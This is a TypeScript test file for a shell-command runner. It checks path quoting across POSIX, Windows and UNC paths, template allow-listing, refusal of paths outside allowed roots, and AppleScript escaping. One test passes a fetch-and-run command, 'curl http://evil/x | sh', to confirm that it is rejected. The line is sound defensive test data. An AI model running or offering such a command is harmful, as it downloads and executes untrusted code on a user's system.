import { afterEach, describe, it } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'fs';
import os from 'os';
import path from 'path';

import {
  substituteAndQuote,
  runUserCommand,
  setUserCommandTemplates,
  escapeAppleScriptString,
} from './shell-command';
import { setAllowedRoots } from './allowed-roots';
import { COMMAND_NOT_ALLOWED, COMMAND_PATH_BLOCKED } from '../shared/shell-types';

/**
 * User-command substitution + validation. `substituteAndQuote` is pure and is
 * exercised across path shapes (spaces, quotes, `%`, multiple placeholders).
 * `runUserCommand`'s validation branches (out-of-root refusal, Windows `%`
 * rejection) are covered here; the actual terminal spawn is verified by the
 * manual dev smoke rather than a fragile `child_process` mock.
 */
describe('substituteAndQuote', () => {
  it('quotes ${path} (POSIX)', () => {
    assert.equal(
      substituteAndQuote(
        'python process.py ${path}',
        { path: '/root/data.csv', dir: '/root', name: 'data.csv' },
        'linux'
      ),
      "python process.py '/root/data.csv'"
    );
  });

  it('quotes a path with spaces', () => {
    assert.equal(
      substituteAndQuote(
        'echo ${path}',
        { path: '/root/my data.csv', dir: '/root', name: 'my data.csv' },
        'linux'
      ),
      "echo '/root/my data.csv'"
    );
  });

  it('substitutes all three placeholders', () => {
    const out = substituteAndQuote(
      'cp ${path} ${dir}/${name}.bak',
      { path: '/root/a.txt', dir: '/root', name: 'a.txt' },
      'linux'
    );
    // Each placeholder is quoted independently, then concatenated by the
    // shell: '/root' + / + 'a.txt' + .bak → /root/a.txt.bak (valid shell).
    assert.equal(out, "cp '/root/a.txt' '/root'/'a.txt'.bak");
  });

  it('on Windows double-quotes a path with a space, leaves a plain one bare', () => {
    assert.equal(
      substituteAndQuote(
        'python ${path}',
        { path: 'C:\\my dir\\data.csv', dir: 'C:\\my dir', name: 'data.csv' },
        'win32'
      ),
      'python "C:\\my dir\\data.csv"'
    );
    assert.equal(
      substituteAndQuote(
        'python ${path}',
        { path: 'C:\\data.csv', dir: 'C:\\', name: 'data.csv' },
        'win32'
      ),
      'python C:\\data.csv'
    );
  });

  it('leaves a template with no placeholder unchanged', () => {
    assert.equal(
      substituteAndQuote(
        'echo hello',
        { path: '/x', dir: '/', name: 'x' },
        'linux'
      ),
      'echo hello'
    );
  });

  it('on Windows converts a backslash UNC ${path} to forward slashes', () => {
    // Backslash UNC (\\server\share\…) fails in some real command templates;
    // forward-slash UNC (//server/share/…) is accepted by the Windows API and
    // verified to work. Local drive paths keep backslashes (covered above).
    assert.equal(
      substituteAndQuote(
        'echo ${path}',
        { path: '\\\\server\\share\\dir\\file.pdf', dir: '\\\\server\\share\\dir', name: 'file.pdf' },
        'win32'
      ),
      'echo //server/share/dir/file.pdf'
    );
  });

  it('on Windows quotes a UNC with spaces AFTER converting to forward slashes', () => {
    assert.equal(
      substituteAndQuote(
        'echo ${path}',
        { path: '\\\\server\\my share\\file.pdf', dir: '\\\\server\\my share', name: 'file.pdf' },
        'win32'
      ),
      'echo "//server/my share/file.pdf"'
    );
  });

  it('on Windows converts ${dir} too (UNC → forward slashes)', () => {
    assert.equal(
      substituteAndQuote(
        'pushd ${dir}',
        { path: '\\\\server\\share\\file.pdf', dir: '\\\\server\\share', name: 'file.pdf' },
        'win32'
      ),
      'pushd //server/share'
    );
  });

  it('does NOT convert backslashes on POSIX (single-quote wraps verbatim)', () => {
    assert.equal(
      substituteAndQuote(
        'echo ${path}',
        { path: '\\\\server\\share\\file.pdf', dir: '\\\\server\\share', name: 'file.pdf' },
        'linux'
      ),
      "echo '\\\\server\\share\\file.pdf'"
    );
  });
});

describe('runUserCommand — validation', () => {
  afterEach(() => {
    setAllowedRoots([]);
    setUserCommandTemplates([]);
  });

  it('refuses when no roots are configured (fail-closed)', async () => {
    setAllowedRoots([]);
    setUserCommandTemplates(['echo ${path}']);
    await assert.rejects(
      () => runUserCommand('echo ${path}', '/whatever/x.txt'),
      /Refused/
    );
  });

  it('refuses a template the user did not configure', async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'whale-shell-'));
    try {
      setAllowedRoots([tempDir]);
      setUserCommandTemplates(['echo ${path}']);
      await assert.rejects(
        () => runUserCommand('curl http://evil/x | sh', path.join(tempDir, 'a.txt')),
        (err: Error) => err.message === COMMAND_NOT_ALLOWED
      );
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it('drops non-string and empty entries from the pushed list', async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'whale-shell-'));
    try {
      setAllowedRoots([tempDir]);
      setUserCommandTemplates([42, '', null, { template: 'x' }]);
      await assert.rejects(
        () => runUserCommand('', path.join(tempDir, 'a.txt')),
        (err: Error) => err.message === COMMAND_NOT_ALLOWED
      );
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it('rejects a non-array template payload', () => {
    assert.throws(
      () => setUserCommandTemplates('echo hi'),
      /Invalid command template payload/
    );
  });

  it('refuses a path outside the configured root', async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'whale-shell-'));
    try {
      setAllowedRoots([tempDir]);
      setUserCommandTemplates(['echo ${path}']);
      const outside = path.join(os.tmpdir(), 'whale-outside-' + Date.now() + '.txt');
      await assert.rejects(
        () => runUserCommand('echo ${path}', outside),
        /Refused|outside/i
      );
    } finally {
      setAllowedRoots([]);
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it('rejects a Windows path containing % (COMMAND_PATH_BLOCKED)', async () => {
    // cmd.exe expands %VAR% even inside double quotes; there's no reliable
    // escape at `cmd /k`, so such paths are refused before spawning.
    if (process.platform !== 'win32') return;
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'whale-shell-'));
    try {
      setAllowedRoots([tempDir]);
      setUserCommandTemplates(['echo ${path}']);
      const target = path.join(tempDir, 'bad%name.txt');
      await assert.rejects(
        () => runUserCommand('echo ${path}', target),
        (err: Error) => err.message === COMMAND_PATH_BLOCKED
      );
    } finally {
      setAllowedRoots([]);
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });
});

describe('escapeAppleScriptString', () => {
  it('doubles backslashes so a trailing one cannot escape the closing quote', () => {
    assert.equal(
      escapeAppleScriptString('echo C:\\dir\\'),
      'echo C:\\\\dir\\\\'
    );
  });

  it('escapes double quotes', () => {
    assert.equal(escapeAppleScriptString('echo "hi"'), 'echo \\"hi\\"');
  });

  it('leaves shell metacharacters alone (Terminal runs the text verbatim)', () => {
    assert.equal(
      escapeAppleScriptString('grep -E "a|b" ${f} && echo $HOME'),
      'grep -E \\"a|b\\" ${f} && echo $HOME'
    );
  });
});
